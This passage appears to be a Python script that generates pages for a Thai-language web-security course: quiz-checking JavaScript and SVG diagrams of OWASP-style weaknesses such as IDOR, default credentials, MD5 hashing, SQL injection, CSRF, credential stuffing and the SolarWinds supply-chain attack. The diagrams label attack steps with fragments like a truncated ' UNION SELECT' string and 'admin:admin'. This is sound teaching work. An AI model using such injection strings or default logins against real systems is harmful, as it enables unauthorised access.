    status.innerHTML = '🏆 <strong>LESSON CLEARED!</strong> คุณผ่านการประเมินความรู้ท้ายบทเรียนย่อยนี้เรียบร้อย (คะแนน 2/2) สามารถเดินทางไปศึกษาบทเรียนถัดไปได้ครับ!';
    
    localStorage.setItem('solved_lesson_180', 'solved');
    if (typeof updateProgressUI === 'function') updateProgressUI();
    groups.forEach(function(g) {
      g.querySelectorAll('.mini-opt').forEach(function(o) {
        o.style.pointerEvents = 'none';
      });
    });
    box.querySelector('.mq-btn-check').disabled = true;
  } else {
    var errorPct = Math.round((score / groups.length) * 100);
    if (fill) { fill.setAttribute('stroke-dasharray', errorPct + ', 100'); fill.style.stroke = '#ff007f'; }
    if (text) text.textContent = errorPct + '%';
    if (status_txt) status_txt.textContent = 'ตอบไม่ถูกต้อง ลองใหม่!';

    status.style.background = 'rgba(255,0,127,0.08)';
    status.style.border = '1px solid rgba(255,0,127,0.25)';
    status.style.color = '#ff007f';
    status.innerHTML = '❌ <strong>ยังไม่ผ่าน!</strong> คุณได้คะแนน ' + score + '/2 (ทำข้อสอบไม่จบตาม Gauge Bar Progress) กรุณาทบทวนบทเรียนและตรวจเลือกคำตอบใหม่อีกครั้ง';
  }
}

setTimeout(function() {
  var solved = localStorage.getItem('solved_lesson_180');
  if (solved === 'solved') {
    var box = document.getElementById('mq-box-180');
    var groups = box.querySelectorAll('.mq-q');
    groups.forEach(function(g) {
      var correctVal = g.getAttribute('data-correct');
      g.querySelectorAll('.mini-opt').forEach(function(o) {
        var val = o.getAttribute('data-val');
        if (val === correctVal) {
          o.classList.add('selected', 'correct');
        }
        o.style.pointerEvents = 'none';
      });
    });
    box.querySelector('.mq-btn-check').disabled = true;
    
    var fill = document.getElementById('lesson-gauge-fill-180');
    var text = document.getElementById('lesson-gauge-text-180');
    var status_txt = document.getElementById('lesson-status-txt-180');
    var status = document.getElementById('mq-status-180');
    
    if (fill) { fill.setAttribute('stroke-dasharray', '100, 100'); fill.style.stroke = '#3ddc84'; }
    if (text) text.textContent = '100%';
    if (status_txt) status_txt.innerHTML = '<span style="color:#3ddc84; font-weight:bold;"><i class="fas fa-check-circle mr-1"></i> ปลดล็อกบทเรียนถัดไปแล้ว</span>';
    
    status.style.display = 'block';
    status.style.background = 'rgba(61,220,132,0.08)';
    status.style.border = '1px solid rgba(61,220,132,0.25)';
    status.style.color = '#3ddc84';
    status.innerHTML = '🏆 <strong>LESSON CLEARED!</strong> คุณผ่านการประเมินความรู้ท้ายบทเรียนย่อยนี้เรียบร้อย (คะแนน 2/2) สามารถเดินทางไปศึกษาบทเรียนถัดไปได้ครับ!';
  }
}, 200);
</script>
"""

# ─── Execute updates ───

# --- Begin Lesson 177 Rich Graphics Integration ---
val177_0_rich = val177_0
HTML_A01 = """<div style="background:#070a13;border:1px solid rgba(0,240,255,0.15);border-radius:12px;padding:20px;text-align:center;margin:15px auto;">
<div style="font-size:0.75rem;color:#00f0ff;font-weight:bold;margin-bottom:12px;text-transform:uppercase;letter-spacing:0.05em;text-shadow:0 0 8px rgba(0,240,255,0.4);">📊 Graphic: A01 - Broken Access Control Bypass</div>
<svg viewBox="0 0 450 160" style="width:100%;height:auto;display:block;margin:0 auto;background:#03050a;border-radius:8px;">
<g transform="translate(25, 45)">
<rect x="0" y="0" width="80" height="45" rx="6" fill="#0f1322" stroke="#ef4444" stroke-width="1.5"/>
<text x="40" y="20" fill="#ffffff" font-size="9" font-family="sans-serif" font-weight="bold" text-anchor="middle">Attacker</text>
<text x="40" y="34" fill="#ef4444" font-size="7" font-family="monospace" text-anchor="middle">Manipulates URL</text>
</g>
<path d="M105,67 L210,67" fill="none" stroke="#ef4444" stroke-width="1.5" stroke-dasharray="4,2"/>
<polygon points="210,67 202,63 202,71" fill="#ef4444"/>
<text x="157" y="58" fill="#ef4444" font-size="8" font-family="monospace" text-anchor="middle">GET /profile/12346</text>
<g transform="translate(220, 30)">
<rect x="0" y="0" width="90" height="75" rx="6" fill="#0f1322" stroke="#3b82f6" stroke-width="1.5"/>
<text x="45" y="20" fill="#ffffff" font-size="9" font-family="sans-serif" font-weight="bold" text-anchor="middle">Web Application</text>
<text x="45" y="38" fill="#94a3b8" font-size="7" font-family="sans-serif" text-anchor="middle">No Authorization</text>
<text x="45" y="50" fill="#94a3b8" font-size="7" font-family="sans-serif" text-anchor="middle">Check Performed!</text>
<rect x="5" y="58" width="80" height="12" rx="2" fill="rgba(239, 68, 68, 0.15)" stroke="#ef4444" stroke-width="0.5"/>
<text x="45" y="67" fill="#ef4444" font-size="7" font-family="monospace" text-anchor="middle" font-weight="bold">Bypassed Validation</text>
</g>
<path d="M310,67 L360,67" fill="none" stroke="#34d399" stroke-width="1.5"/>
<polygon points="360,67 352,63 352,71" fill="#34d399"/>
<g transform="translate(370, 45)">
<rect x="0" y="0" width="60" height="45" rx="6" fill="#0f1322" stroke="#34d399" stroke-width="1.5"/>
<text x="30" y="20" fill="#ffffff" font-size="9" font-family="sans-serif" font-weight="bold" text-anchor="middle">User 12346</text>
<text x="30" y="34" fill="#34d399" font-size="7" font-family="monospace" text-anchor="middle">Data Exposed</text>
</g>
</svg>
</div>"""

HTML_A02 = """<div style="background:#070a13;border:1px solid rgba(168,85,247,0.15);border-radius:12px;padding:20px;text-align:center;margin:15px auto;">
<div style="font-size:0.75rem;color:#a855f7;font-weight:bold;margin-bottom:12px;text-transform:uppercase;letter-spacing:0.05em;text-shadow:0 0 8px rgba(168,85,247,0.4);">📊 Graphic: A02 - Security Misconfiguration Vulnerabilities</div>
<svg viewBox="0 0 450 160" style="width:100%;height:auto;display:block;margin:0 auto;background:#03050a;border-radius:8px;">
<g transform="translate(30, 20)">
<rect x="0" y="0" width="120" height="110" rx="8" fill="#0f1322" stroke="#a855f7" stroke-width="1.5"/>
<text x="60" y="22" fill="#ffffff" font-size="10" font-family="sans-serif" font-weight="bold" text-anchor="middle">Target Server</text>
<g transform="translate(10, 35)">
<rect x="0" y="0" width="100" height="18" rx="3" fill="rgba(239, 68, 68, 0.1)" stroke="#ef4444" stroke-width="0.75"/>
<text x="50" y="11" fill="#ef4444" font-size="7" font-family="monospace" text-anchor="middle">Default admin:admin</text>
</g>
<g transform="translate(10, 60)">
<rect x="0" y="0" width="100" height="18" rx="3" fill="rgba(239, 68, 68, 0.1)" stroke="#ef4444" stroke-width="0.75"/>
<text x="50" y="11" fill="#ef4444" font-size="7" font-family="monospace" text-anchor="middle">Directory Listing ON</text>
</g>
<g transform="translate(10, 85)">
<rect x="0" y="0" width="100" height="18" rx="3" fill="rgba(239, 68, 68, 0.1)" stroke="#ef4444" stroke-width="0.75"/>
<text x="50" y="11" fill="#ef4444" font-size="7" font-family="monospace" text-anchor="middle">Debug Stack Traces</text>
</g>
</g>
<path d="M150,75 L290,75" fill="none" stroke="#ef4444" stroke-width="1.5" stroke-dasharray="4,2"/>
<polygon points="290,75 282,71 282,79" fill="#ef4444"/>
<text x="220" y="65" fill="#ef4444" font-size="8" font-family="monospace" text-anchor="middle">Exposes Config & Passwords</text>
<g transform="translate(305, 45)">
<rect x="0" y="0" width="110" height="55" rx="6" fill="#0f1322" stroke="#ef4444" stroke-width="1.5"/>
<text x="55" y="20" fill="#ffffff" font-size="9" font-family="sans-serif" font-weight="bold" text-anchor="middle">External Attacker</text>
<text x="55" y="34" fill="#ef4444" font-size="7" font-family="sans-serif" text-anchor="middle">Gains Server Access</text>
<text x="55" y="45" fill="#ef4444" font-size="7" font-family="monospace" text-anchor="middle">via default login</text>
</g>
</svg>
</div>"""

HTML_A03 = """<div style="background:#070a13;border:1px solid rgba(0,240,255,0.15);border-radius:12px;padding:20px;text-align:center;margin:15px auto;">
<div style="font-size:0.75rem;color:#00f0ff;font-weight:bold;margin-bottom:12px;text-transform:uppercase;letter-spacing:0.05em;text-shadow:0 0 8px rgba(0,240,255,0.4);">📊 Graphic: A03 - SolarWinds Orion Supply Chain Attack Flow</div>
<svg viewBox="0 0 460 170" style="width:100%;height:auto;display:block;margin:0 auto;background:#03050a;border-radius:8px;">
<g transform="translate(10, 45)">
<rect x="0" y="0" width="70" height="50" rx="4" fill="#0f1322" stroke="#3b82f6" stroke-width="1"/>
<text x="35" y="16" fill="#ffffff" font-size="7" font-family="sans-serif" font-weight="bold" text-anchor="middle">SolarWinds</text>
<text x="35" y="28" fill="#94a3b8" font-size="6" font-family="sans-serif" text-anchor="middle">Update FTP Server</text>
<rect x="4" y="36" width="62" height="10" rx="1.5" fill="rgba(239, 68, 68, 0.15)" stroke="#ef4444" stroke-width="0.5"/>
<text x="35" y="43" fill="#ef4444" font-size="5.5" font-family="monospace" text-anchor="middle">Initial Malware</text>
</g>
<path d="M80,70 L115,70" fill="none" stroke="#3b82f6" stroke-width="1"/>
<g transform="translate(120, 45)">
<rect x="0" y="0" width="70" height="50" rx="4" fill="#0f1322" stroke="#fbbf24" stroke-width="1"/>
<text x="35" y="18" fill="#ffffff" font-size="7" font-family="sans-serif" font-weight="bold" text-anchor="middle">Orion Software</text>
<text x="35" y="30" fill="#94a3b8" font-size="6" font-family="sans-serif" text-anchor="middle">Privileged App</text>
<text x="35" y="42" fill="#fbbf24" font-size="6" font-family="monospace" text-anchor="middle">Malicious Update</text>
</g>
<path d="M190,70 L215,45" fill="none" stroke="#ef4444" stroke-width="1"/>
<path d="M190,70 L215,70" fill="none" stroke="#ef4444" stroke-width="1"/>
<path d="M190,70 L215,95" fill="none" stroke="#ef4444" stroke-width="1"/>
<g transform="translate(220, 20)">
<g transform="translate(0, 0)">
<rect x="0" y="0" width="65" height="20" rx="3" fill="#0f1322" stroke="#ef4444" stroke-width="1"/>
<text x="32" y="12" fill="#ffffff" font-size="6.5" font-family="sans-serif" text-anchor="middle">Gov. Agency</text>
</g>
<g transform="translate(0, 35)">
<rect x="0" y="0" width="65" height="20" rx="3" fill="#0f1322" stroke="#ef4444" stroke-width="1"/>
<text x="32" y="12" fill="#ffffff" font-size="6.5" font-family="sans-serif" text-anchor="middle">Enterprise</text>
</g>
<g transform="translate(0, 70)">
<rect x="0" y="0" width="65" height="20" rx="3" fill="#0f1322" stroke="#ef4444" stroke-width="1"/>
<text x="32" y="12" fill="#ffffff" font-size="6.5" font-family="sans-serif" text-anchor="middle">Infrastructure</text>
</g>
<text x="32" y="105" fill="#ef4444" font-size="6" font-family="monospace" text-anchor="middle">Pwned via backdoor</text>
</g>
<path d="M285,30 L320,45" fill="none" stroke="#ef4444" stroke-width="1"/>
<path d="M285,45 L320,70" fill="none" stroke="#ef4444" stroke-width="1"/>
<path d="M285,90 L320,95" fill="none" stroke="#ef4444" stroke-width="1"/>
<g transform="translate(325, 30)">
<rect x="0" y="0" width="55" height="80" rx="4" fill="#0f1322" stroke="#34d399" stroke-width="1"/>
<text x="27" y="16" fill="#ffffff" font-size="7" font-family="sans-serif" font-weight="bold" text-anchor="middle">Protected</text>
<text x="27" y="28" fill="#ffffff" font-size="7" font-family="sans-serif" font-weight="bold" text-anchor="middle">Systems</text>
<rect x="4" y="38" width="47" height="10" rx="1.5" fill="rgba(239, 68, 68, 0.15)" stroke="#ef4444" stroke-width="0.5"/>
<text x="27" y="45" fill="#ef4444" font-size="5" font-family="monospace" text-anchor="middle">Malware injected</text>
<text x="27" y="64" fill="#94a3b8" font-size="6.5" font-family="sans-serif" text-anchor="middle">Controlled</text>
<text x="27" y="73" fill="#94a3b8" font-size="6.5" font-family="sans-serif" text-anchor="middle">by Backdoor</text>
</g>
<path d="M380,70 L400,70" fill="none" stroke="#ef4444" stroke-width="1"/>
<g transform="translate(405, 50)">
<circle cx="20" cy="20" r="18" fill="#0f1322" stroke="#ef4444" stroke-width="1"/>
<text x="20" y="18" fill="#ffffff" font-size="7" font-family="sans-serif" text-anchor="middle" font-weight="bold">Sensitive</text>
<text x="20" y="27" fill="#ef4444" font-size="6.5" font-family="monospace" text-anchor="middle">Data</text>
</g>
</svg>
</div>"""

HTML_A04 = """<div style="background:#070a13;border:1px solid rgba(59,130,246,0.15);border-radius:12px;padding:20px;text-align:center;margin:15px auto;">
<div style="font-size:0.75rem;color:#3b82f6;font-weight:bold;margin-bottom:12px;text-transform:uppercase;letter-spacing:0.05em;text-shadow:0 0 8px rgba(59,130,246,0.4);">📊 Graphic: A04 - Cryptographic Failures & Weak Hashing</div>
<svg viewBox="0 0 450 160" style="width:100%;height:auto;display:block;margin:0 auto;background:#03050a;border-radius:8px;">
<g transform="translate(30, 50)">
<rect x="0" y="0" width="80" height="40" rx="4" fill="#0f1322" stroke="#3b82f6" stroke-width="1.2"/>
<text x="40" y="16" fill="#cbd5e1" font-size="8" font-family="sans-serif" text-anchor="middle">User Password</text>
<text x="40" y="29" fill="#00f0ff" font-size="8" font-family="monospace" text-anchor="middle">"pass1234"</text>
</g>
<path d="M110,70 L170,70" fill="none" stroke="#ef4444" stroke-width="1.2"/>
<polygon points="170,70 164,66 164,74" fill="#ef4444"/>
<text x="140" y="60" fill="#ef4444" font-size="7" font-family="monospace" text-anchor="middle">MD5 Hash</text>
<g transform="translate(180, 25)">
<rect x="0" y="0" width="110" height="90" rx="6" fill="#0f1322" stroke="#ef4444" stroke-width="1.5"/>
<text x="55" y="18" fill="#ffffff" font-size="9" font-family="sans-serif" font-weight="bold" text-anchor="middle">Insecure Database</text>
<text x="10" y="40" fill="#94a3b8" font-size="7" font-family="monospace">admin : 5f4dcc3b5aa...</text>
<text x="10" y="55" fill="#94a3b8" font-size="7" font-family="monospace">user1 : plainPassword</text>
<line x1="5" y1="65" x2="105" y2="65" stroke="rgba(255,255,255,0.05)" stroke-width="1"/>
<text x="55" y="78" fill="#ef4444" font-size="7" font-family="monospace" text-anchor="middle">No Salt / Weak Hash</text>
</g>
<path d="M290,70 L340,70" fill="none" stroke="#ef4444" stroke-width="1.2"/>
<polygon points="340,70 334,66 334,74" fill="#ef4444"/>
<g transform="translate(350, 45)">
<rect x="0" y="0" width="70" height="50" rx="4" fill="#0f1322" stroke="#ef4444" stroke-width="1.2"/>
<text x="35" y="18" fill="#ffffff" font-size="8" font-family="sans-serif" font-weight="bold" text-anchor="middle">Attacker</text>
<text x="35" y="32" fill="#ef4444" font-size="7" font-family="monospace" text-anchor="middle">Decodes MD5</text>
<text x="35" y="42" fill="#ef4444" font-size="7" font-family="monospace" text-anchor="middle">in seconds!</text>
</g>
</svg>
</div>"""

HTML_A05 = """<div style="background:#070a13;border:1px solid rgba(239,68,68,0.15);border-radius:12px;padding:20px;text-align:center;margin:15px auto;">
<div style="font-size:0.75rem;color:#ef4444;font-weight:bold;margin-bottom:12px;text-transform:uppercase;letter-spacing:0.05em;text-shadow:0 0 8px rgba(239,68,68,0.4);">📊 Graphic: A05 - Injection Attack Vector Flow</div>
<svg viewBox="0 0 450 160" style="width:100%;height:auto;display:block;margin:0 auto;background:#03050a;border-radius:8px;">
<g transform="translate(20, 45)">
<rect x="0" y="0" width="90" height="50" rx="6" fill="#0f1322" stroke="#ef4444" stroke-width="1.5"/>
<text x="45" y="18" fill="#ffffff" font-size="9" font-family="sans-serif" font-weight="bold" text-anchor="middle">Attacker</text>
<text x="45" y="32" fill="#ef4444" font-size="7" font-family="monospace" text-anchor="middle">Injects SQL / Cmd</text>
<text x="45" y="42" fill="#ef4444" font-size="6.5" font-family="monospace" text-anchor="middle">' UNION SELECT...</text>
</g>
<path d="M110,60 L200,60" fill="none" stroke="#ef4444" stroke-width="1.2"/>
<polygon points="200,60 194,56 194,64" fill="#ef4444"/>
<text x="155" y="52" fill="#ef4444" font-size="7.5" font-family="monospace" text-anchor="middle">1. Sends malicious input</text>
<path d="M200,85 L110,85" fill="none" stroke="#34d399" stroke-width="1.2" stroke-dasharray="3,2"/>
<polygon points="110,85 116,89 116,81" fill="#34d399"/>
<text x="155" y="100" fill="#34d399" font-size="7.5" font-family="monospace" text-anchor="middle">4. Exfiltrated database data</text>
<g transform="translate(210, 35)">
<rect x="0" y="0" width="100" height="70" rx="6" fill="#0f1322" stroke="#3b82f6" stroke-width="1.5"/>
<text x="50" y="18" fill="#ffffff" font-size="9" font-family="sans-serif" font-weight="bold" text-anchor="middle">Web API Server</text>
<text x="50" y="34" fill="#94a3b8" font-size="7" font-family="sans-serif" text-anchor="middle">No input filter</text>
<text x="50" y="46" fill="#ef4444" font-size="6.5" font-family="monospace" text-anchor="middle">2. Evaluates query</text>
<text x="50" y="58" fill="#94a3b8" font-size="6.5" font-family="sans-serif" text-anchor="middle">direct to DB</text>
</g>
<path d="M310,60 L360,60" fill="none" stroke="#ef4444" stroke-width="1.2"/>
<polygon points="360,60 354,56 354,64" fill="#ef4444"/>
<path d="M360,80 L310,80" fill="none" stroke="#34d399" stroke-width="1.2"/>
<polygon points="310,80 316,84 316,76" fill="#34d399"/>
<text x="335" y="94" fill="#34d399" font-size="7" font-family="monospace" text-anchor="middle">3. Data output</text>
<g transform="translate(370, 35)">
<rect x="0" y="0" width="60" height="70" rx="6" fill="#0f1322" stroke="#34d399" stroke-width="1.5"/>
<text x="30" y="24" fill="#ffffff" font-size="9" font-family="sans-serif" font-weight="bold" text-anchor="middle">Password</text>
<text x="30" y="36" fill="#ffffff" font-size="9" font-family="sans-serif" font-weight="bold" text-anchor="middle">Database</text>
<text x="30" y="52" fill="#34d399" font-size="8" font-family="monospace" text-anchor="middle">SQLite/MySQL</text>
</g>
</svg>
</div>"""

HTML_A06 = """<div style="background:#070a13;border:1px solid rgba(16,185,129,0.15);border-radius:12px;padding:20px;text-align:center;margin:15px auto;">
<div style="font-size:0.75rem;color:#10b981;font-weight:bold;margin-bottom:12px;text-transform:uppercase;letter-spacing:0.05em;text-shadow:0 0 8px rgba(16,185,129,0.4);">📊 Graphic: A06 - Insecure Design Attack Vectors</div>
<svg viewBox="0 0 450 160" style="width:100%;height:auto;display:block;margin:0 auto;background:#03050a;border-radius:8px;">
<g transform="translate(30, 45)">
<rect x="0" y="0" width="100" height="50" rx="6" fill="#0f1322" stroke="#fbbf24" stroke-width="1.2"/>
<text x="50" y="18" fill="#ffffff" font-size="8.5" font-family="sans-serif" font-weight="bold" text-anchor="middle">Change Password</text>
<text x="50" y="32" fill="#ef4444" font-size="7" font-family="monospace" text-anchor="middle">No Old Password Req</text>
<text x="50" y="42" fill="#ef4444" font-size="7" font-family="monospace" text-anchor="middle">No Rate Limiting</text>
</g>
<path d="M130,70 L210,70" fill="none" stroke="#ef4444" stroke-width="1.5"/>
<polygon points="210,70 204,66 204,74" fill="#ef4444"/>
<text x="170" y="60" fill="#ef4444" font-size="8" font-family="monospace" text-anchor="middle">CSRF Exploit</text>
<g transform="translate(220, 35)">
<rect x="0" y="0" width="100" height="70" rx="6" fill="#0f1322" stroke="#3b82f6" stroke-width="1.5"/>
<text x="50" y="20" fill="#ffffff" font-size="9" font-family="sans-serif" font-weight="bold" text-anchor="middle">Vulnerable API</text>
<text x="50" y="38" fill="#94a3b8" font-size="7" font-family="sans-serif" text-anchor="middle">Accepts direct POST</text>
<rect x="5" y="48" width="90" height="15" rx="2" fill="rgba(239, 68, 68, 0.15)" stroke="#ef4444" stroke-width="0.5"/>
<text x="50" y="58" fill="#ef4444" font-size="7.5" font-family="monospace" text-anchor="middle" font-weight="bold">Password Changed!</text>
</g>
<path d="M320,70 L360,70" fill="none" stroke="#34d399" stroke-width="1.5"/>
<polygon points="360,70 354,66 354,74" fill="#34d399"/>
<g transform="translate(370, 45)">
<rect x="0" y="0" width="60" height="50" rx="4" fill="#0f1322" stroke="#34d399" stroke-width="1.2"/>
<text x="30" y="20" fill="#ffffff" font-size="8.5" font-family="sans-serif" font-weight="bold" text-anchor="middle">Hijacked</text>
<text x="30" y="34" fill="#34d399" font-size="7.5" font-family="monospace" text-anchor="middle">User Account</text>
</g>
</svg>
</div>"""

HTML_A07 = """<div style="background:#070a13;border:1px solid rgba(249,115,22,0.15);border-radius:12px;padding:20px;text-align:center;margin:15px auto;">
<div style="font-size:0.75rem;color:#f97316;font-weight:bold;margin-bottom:12px;text-transform:uppercase;letter-spacing:0.05em;text-shadow:0 0 8px rgba(249,115,22,0.4);">📊 Graphic: A07 - Credential Stuffing & Botnets Flow</div>
<svg viewBox="0 0 450 170" style="width:100%;height:auto;display:block;margin:0 auto;background:#03050a;border-radius:8px;">
<g transform="translate(15, 60)">
<rect x="0" y="0" width="80" height="40" rx="6" fill="#0f1322" stroke="#ef4444" stroke-width="1.5"/>
<text x="40" y="18" fill="#ffffff" font-size="9" font-family="sans-serif" font-weight="bold" text-anchor="middle">Attacker</text>
<text x="40" y="30" fill="#ef4444" font-size="7.5" font-family="monospace" text-anchor="middle">Stolen Logins</text>
</g>
<path d="M95,80 L135,50" fill="none" stroke="#ef4444" stroke-width="1"/>
<path d="M95,80 L135,80" fill="none" stroke="#ef4444" stroke-width="1"/>
<path d="M95,80 L135,110" fill="none" stroke="#ef4444" stroke-width="1"/>
<g transform="translate(140, 30)">
<g transform="translate(0, 0)">
<rect x="0" y="0" width="60" height="20" rx="3" fill="#0f1322" stroke="#fbbf24" stroke-width="1"/>
<text x="30" y="13" fill="#fbbf24" font-size="7" font-family="monospace" text-anchor="middle">Bot Node 01</text>
</g>
<g transform="translate(0, 35)">
<rect x="0" y="0" width="60" height="20" rx="3" fill="#0f1322" stroke="#fbbf24" stroke-width="1"/>
<text x="30" y="13" fill="#fbbf24" font-size="7" font-family="monospace" text-anchor="middle">Bot Node 02</text>
</g>
<g transform="translate(0, 70)">
<rect x="0" y="0" width="60" height="20" rx="3" fill="#0f1322" stroke="#fbbf24" stroke-width="1"/>
<text x="30" y="13" fill="#fbbf24" font-size="7" font-family="monospace" text-anchor="middle">Bot Node 03</text>
</g>
</g>
<path d="M200,40 L245,30" fill="none" stroke="#ef4444" stroke-width="1"/>
<path d="M200,80 L245,80" fill="none" stroke="#ef4444" stroke-width="1"/>
<path d="M200,100 L245,130" fill="none" stroke="#ef4444" stroke-width="1"/>
<g transform="translate(250, 15)">
<g transform="translate(0, 0)">
<rect x="0" y="0" width="105" height="30" rx="4" fill="#0f1322" stroke="#3b82f6" stroke-width="1"/>
<text x="52" y="14" fill="#ffffff" font-size="7" font-family="sans-serif" text-anchor="middle">Target Web App A</text>
<text x="52" y="24" fill="#ef4444" font-size="6.5" font-family="monospace" text-anchor="middle">Attempt Failed</text>
</g>
<g transform="translate(0, 45)">
<rect x="0" y="0" width="105" height="30" rx="4" fill="#0f1322" stroke="#3b82f6" stroke-width="1"/>
<text x="52" y="14" fill="#ffffff" font-size="7" font-family="sans-serif" text-anchor="middle">Target Web App B</text>
<text x="52" y="24" fill="#34d399" font-size="6.5" font-family="monospace" text-anchor="middle" font-weight="bold">Access Granted! ✔</text>
</g>
<g transform="translate(0, 90)">
<rect x="0" y="0" width="105" height="30" rx="4" fill="#0f1322" stroke="#3b82f6" stroke-width="1"/>
<text x="52" y="14" fill="#ffffff" font-size="7" font-family="sans-serif" text-anchor="middle">Target Web App C</text>
<text x="52" y="24" fill="#ef4444" font-size="6.5" font-family="monospace" text-anchor="middle">Attempt Failed</text>
</g>
<text x="52" y="132" fill="#ef4444" font-size="6.5" font-family="sans-serif" text-anchor="middle">Tests credentials automatically</text>
</g>
</svg>
</div>"""

HTML_A08 = """<div style="background:#070a13;border:1px solid rgba(239,68,68,0.15);border-radius:12px;padding:20px;text-align:center;margin:15px auto;">
<div style="font-size:0.75rem;color:#ef4444;font-weight:bold;margin-bottom:12px;text-transform:uppercase;letter-spacing:0.05em;text-shadow:0 0 8px rgba(239,68,68,0.4);">📊 Graphic: A08 - Software and Data Integrity Failures</div>
<svg viewBox="0 0 450 160" style="width:100%;height:auto;display:block;margin:0 auto;background:#03050a;border-radius:8px;">
<g transform="translate(30, 45)">
<rect x="0" y="0" width="80" height="50" rx="4" fill="#0f1322" stroke="#3b82f6" stroke-width="1.2"/>
<text x="40" y="18" fill="#ffffff" font-size="8" font-family="sans-serif" font-weight="bold" text-anchor="middle">NPM / PyPI</text>
<text x="40" y="32" fill="#94a3b8" font-size="6.5" font-family="sans-serif" text-anchor="middle">Unsigned Lib</text>
<text x="40" y="42" fill="#fbbf24" font-size="7" font-family="monospace" text-anchor="middle">Package.tar.gz</text>
</g>
<path d="M110,70 L210,70" fill="none" stroke="#ef4444" stroke-width="1.5" stroke-dasharray="4,2"/>
<polygon points="210,70 204,66 204,74" fill="#ef4444"/>
<g transform="translate(130, 15)">
<circle cx="15" cy="8" r="6" fill="#ef4444"/>
<path d="M5,22 C5,14 25,14 25,22 Z" fill="#ef4444"/>
<text x="55" y="15" fill="#ef4444" font-size="7" font-family="sans-serif">Malicious payload injected</text>
</g>
<g transform="translate(220, 45)">
<rect x="0" y="0" width="90" height="50" rx="6" fill="#0f1322" stroke="#ef4444" stroke-width="1.5"/>
<text x="45" y="18" fill="#ffffff" font-size="8.5" font-family="sans-serif" font-weight="bold" text-anchor="middle">Deployment</text>
<text x="45" y="32" fill="#ef4444" font-size="7" font-family="sans-serif" text-anchor="middle">No verification check</text>
<text x="45" y="43" fill="#ef4444" font-size="6.5" font-family="monospace" text-anchor="middle">Backdoor deployed!</text>
</g>
<path d="M310,70 L360,70" fill="none" stroke="#ef4444" stroke-width="1.2"/>
<polygon points="360,70 354,66 354,74" fill="#ef4444"/>
<g transform="translate(370, 45)">
<rect x="0" y="0" width="60" height="50" rx="4" fill="#0f1322" stroke="#ef4444" stroke-width="1.2"/>
<text x="30" y="20" fill="#ffffff" font-size="8.5" font-family="sans-serif" font-weight="bold" text-anchor="middle">Compromised</text>
<text x="30" y="34" fill="#ef4444" font-size="7.5" font-family="monospace" text-anchor="middle">Production Server</text>
</g>
</svg>
</div>"""

HTML_A09 = """<div style="background:#070a13;border:1px solid rgba(251,191,36,0.15);border-radius:12px;padding:20px;text-align:center;margin:15px auto;">
<div style="font-size:0.75rem;color:#fbbf24;font-weight:bold;margin-bottom:12px;text-transform:uppercase;letter-spacing:0.05em;text-shadow:0 0 8px rgba(251,191,36,0.4);">📊 Graphic: A09 - Logging and Auditing Failures</div>
<svg viewBox="0 0 450 160" style="width:100%;height:auto;display:block;margin:0 auto;background:#03050a;border-radius:8px;">
<g transform="translate(30, 45)">
<rect x="0" y="0" width="90" height="50" rx="4" fill="#0f1322" stroke="#ef4444" stroke-width="1.2"/>
<text x="45" y="20" fill="#ffffff" font-size="8.5" font-family="sans-serif" font-weight="bold" text-anchor="middle">Attacker</text>
<text x="45" y="34" fill="#ef4444" font-size="7.5" font-family="monospace" text-anchor="middle">Sends 10,000 requests</text>
</g>
<path d="M120,70 L210,70" fill="none" stroke="#ef4444" stroke-width="1.5"/>
<polygon points="210,70 204,66 204,74" fill="#ef4444"/>
<g transform="translate(220, 30)">
<rect x="0" y="0" width="100" height="80" rx="6" fill="#0f1322" stroke="#3b82f6" stroke-width="1.5"/>
<text x="50" y="20" fill="#ffffff" font-size="9" font-family="sans-serif" font-weight="bold" text-anchor="middle">Web Server</text>
<rect x="10" y="35" width="80" height="35" rx="3" fill="#020408" stroke="rgba(239, 68, 68, 0.3)" stroke-width="1"/>
<text x="50" y="47" fill="#64748b" font-size="7" font-family="monospace" text-anchor="middle">Server Log:</text>
<text x="50" y="58" fill="#ef4444" font-size="6.5" font-family="monospace" text-anchor="middle" font-weight="bold">[Empty / Null]</text>
</g>
<path d="M320,70 L360,70" fill="none" stroke="#ef4444" stroke-width="1.2"/>
<polygon points="360,70 354,66 354,74" fill="#ef4444"/>
<g transform="translate(370, 45)">
<rect x="0" y="0" width="60" height="50" rx="4" fill="#0f1322" stroke="#ef4444" stroke-width="1.2"/>
<text x="30" y="18" fill="#ffffff" font-size="8.5" font-family="sans-serif" font-weight="bold" text-anchor="middle">Undetected</text>
<text x="30" y="30" fill="#ef4444" font-size="7.5" font-family="monospace" text-anchor="middle">Breach</text>
<text x="30" y="42" fill="#ef4444" font-size="7.5" font-family="monospace" text-anchor="middle">for weeks</text>
</g>
</svg>
</div>"""

HTML_A10 = """<div style="background:#070a13;border:1px solid rgba(20,184,166,0.15);border-radius:12px;padding:20px;text-align:center;margin:15px auto;">
<div style="font-size:0.75rem;color:#14b8a6;font-weight:bold;margin-bottom:12px;text-transform:uppercase;letter-spacing:0.05em;text-shadow:0 0 8px rgba(20,184,166,0.4);">📊 Graphic: A10 - Exception Bypass Flow</div>
<svg viewBox="0 0 450 160" style="width:100%;height:auto;display:block;margin:0 auto;background:#03050a;border-radius:8px;">
<g transform="translate(20, 50)">
<rect x="0" y="0" width="90" height="40" rx="4" fill="#0f1322" stroke="#3b82f6" stroke-width="1.2"/>
<text x="45" y="16" fill="#cbd5e1" font-size="8" font-family="sans-serif" text-anchor="middle">Unexpected Input</text>
<text x="45" y="29" fill="#00f0ff" font-size="8" font-family="monospace" text-anchor="middle">null / malformed</text>
</g>
<path d="M110,70 L170,70" fill="none" stroke="#ef4444" stroke-width="1.2"/>
<polygon points="170,70 164,66 164,74" fill="#ef4444"/>
<text x="140" y="60" fill="#ef4444" font-size="7" font-family="monospace" text-anchor="middle">Trigger Error</text>
<g transform="translate(180, 25)">
<rect x="0" y="0" width="120" height="90" rx="6" fill="#0f1322" stroke="#ef4444" stroke-width="1.5"/>
<text x="60" y="18" fill="#ffffff" font-size="8.5" font-family="sans-serif" font-weight="bold" text-anchor="middle">Application logic</text>
<text x="60" y="32" fill="#94a3b8" font-size="7" font-family="monospace">try {</text>
<text x="65" y="47" fill="#ef4444" font-size="7.5" font-family="monospace" font-weight="bold">  checkAuth(); // Error!</text>
<text x="60" y="62" fill="#94a3b8" font-size="7" font-family="monospace">} catch {</text>
<rect x="8" y="68" width="104" height="16" rx="2" fill="rgba(239, 68, 68, 0.15)" stroke="#ef4444" stroke-width="0.5"/>
